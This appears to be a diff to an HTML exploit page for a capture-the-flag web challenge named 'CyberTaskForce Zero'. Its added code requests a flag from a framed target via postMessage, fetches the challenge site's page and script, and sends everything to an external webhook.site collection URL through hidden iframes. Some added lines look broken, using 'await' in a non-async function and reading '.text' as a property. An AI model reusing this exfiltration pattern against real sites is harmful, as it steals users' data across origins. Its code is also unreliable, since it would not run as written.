@@ -2,20 +2,22 @@
     <head>
         <title>CyberTaskForce Zero</title>
         <script>
+            function leak_data(data) {
+                let iframe = document.createElement("iframe");
+                iframe.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/" + encodeURIComponent(data);
+                document.body.appendChild(iframe);
+            }
             function start_attack() {
                 let start_frame = document.createElement("iframe");
                 start_frame.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/loaded";
                 document.body.appendChild(start_frame);
                 window.addEventListener("message", (event) => {
-                    let iframe = document.createElement("iframe");
-                    iframe.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/" + encodeURIComponent(event.data);
-                    document.body.appendChild(iframe);
+                    leak_data(event.data);
                 });
                 let target = document.getElementById("target");
                 target.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
-                let iframe_html = document.createElement("iframe");
-                iframe_html.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/" + encodeURIComponent(target.contentWindow.document.documentElement.outerHTML);
-                document.body.appendChild(iframe_html);
+                leak_data((await fetch("https://chall1.jsapi.tech")).text);
+                leak_data((await fetch("https://chall1.jsapi.tech/script.js")).text);
             }
             document.domain = "chall1.jsapi.tech";
         </script>
